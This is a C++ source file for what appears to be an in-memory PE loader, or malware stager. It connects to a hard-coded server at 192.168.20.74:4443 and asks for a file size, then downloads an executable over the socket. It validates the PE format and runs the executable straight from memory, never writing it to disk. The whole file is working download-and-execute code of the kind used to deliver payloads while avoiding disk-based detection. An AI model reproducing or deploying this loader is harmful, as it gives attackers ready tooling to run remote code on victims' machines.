//https://learn.microsoft.com/en-us/windows/win32/winsock/creating-a-basic-winsock-application
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include <stdio.h>
#include "TCPClient.h"
#include "Loader.h"

#define CONNECTION_ERROR -1
#define RECIVE_DATE_ERROR -2
#define SENDING_ERROR -3
#define VALIDATION_PE_ERROR -4

int main()
{

	printf("[+] Connecting!\n");

	//Initialize tcp client class 
	TCPClient tcpClient;
	
	//Receiving buffer
	std::vector<char> recvBuff;
	int iResult;
	
	//Value to check correct actions
	BOOL bConnResult;
	BOOL bSendResult;

	// Contecting to server
	bConnResult = tcpClient.connectToServer("192.168.20.74", 4443);;
	if (!bConnResult) {
		return CONNECTION_ERROR;
	}

	printf("[+] Connected!\n");
	printf("[+] Send command to get file size!\n");

	// Send to the server to get file size
	bSendResult = tcpClient.sendToServer("GetFileSize");
	if (!bSendResult) {
		return SENDING_ERROR;
	}

	// validation
	iResult = tcpClient.reciveData();
	if (iResult <= 0) {
		return RECIVE_DATE_ERROR;
	}
	
	// Getting received buffer 
	recvBuff = tcpClient.getBuffer();

	// vector<char> to string 
	std::string sFileLength(recvBuff.begin(), recvBuff.end());
	printf("[+] Received data: %s\n", sFileLength.c_str());
	
	// str to int 
	int iFileLength = std::stoi(sFileLength);

	// Change the buffer length for the received data  
	tcpClient.setBufLen(iFileLength);

	printf("[+] Send command to load PE!\n");

	//Send to the server for load PE in memory
	bSendResult = tcpClient.sendToServer("start");
	if (!bSendResult) {
		return SENDING_ERROR;
	}

	//We use delay to make sure the server sends the whole file.
	Sleep(1000 * 5);

	// Getting data
	iResult = tcpClient.reciveData();
	if (iResult <= 0 ) {
		return RECIVE_DATE_ERROR;
	}

	// save to our buffer 
	recvBuff = tcpClient.getBuffer();
	printf("[+] Received data: %.*s\n", iResult, recvBuff.data());

	//Initialize Load PE class
	Loader* loader = new Loader();

	// Validation to correct PE format
	BOOL bResult = loader->Validating((LPBYTE)recvBuff.data());
	if (!bResult) {
		return VALIDATION_PE_ERROR;
	}

	// Executing PE 
	loader->Execute((LPBYTE)recvBuff.data());
	printf("[+] Closing. Good bye!\n");

	return 1;

}